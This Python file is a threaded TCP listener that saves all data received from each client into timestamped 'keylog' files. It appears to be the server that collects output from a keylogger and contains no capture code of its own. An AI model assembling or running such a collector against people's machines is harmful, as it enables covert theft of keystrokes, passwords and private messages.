import datetime
import os
import socket
import sys
import threading
import time


def logger(prefix: str, message: str) -> None:
    log_string = (
        f"{datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S')} - "
        f"Logger:{prefix} - {message}"
    )
    with open(
        os.path.join(
            os.path.normpath(os.path.join(os.path.dirname(__file__), "data\\logs")),
            "activity.log",
        ),
        "a+",
    ) as log:
        log.write(log_string + "\n")
    print(log_string)


class Client(threading.Thread):
    def __init__(self, conn: socket.socket) -> None:
        threading.Thread.__init__(self)
        self.conn = conn
        self.timestamp = int(time.time())

    @staticmethod
    def localise_path(path: str) -> str:
        return os.path.join(os.path.dirname(os.path.realpath(__file__)), path)

    def run(self) -> None:
        log_file = self.localise_path(f"data\\logs\\keylog_{self.timestamp}.log")
        with open(log_file, mode="wb+", buffering=0) as log:
            log.write(
                bytes(
                    "Client connected from {}:{}\n\n".format(*self.conn.getpeername()),
                    "utf-8",
                )
            )
            logger(
                "INFO", "Listening for data from {}:{}".format(*self.conn.getpeername())
            )
            while True:
                try:
                    data = self.conn.recv(1024)
                except OSError:
                    break
                else:
                    if not data:
                        break
                    else:
                        log.write(data)
        logger("INFO", "Disconnection from {}:{}".format(*self.conn.getpeername()))


def main(host: str, port: int) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ls:
        ls.bind((host, port))
        ls.listen()
        logger("INFO", "Listening on {}:{}".format(*ls.getsockname()))
        while True:
            conn, _ = ls.accept()
            logger("INFO", "Connection from {}:{}".format(*conn.getpeername()))
            Client(conn).start()


if __name__ == "__main__":
    try:
        main("127.0.0.1", 6000)
    except AttributeError as error:
        logger("ERROR", error)
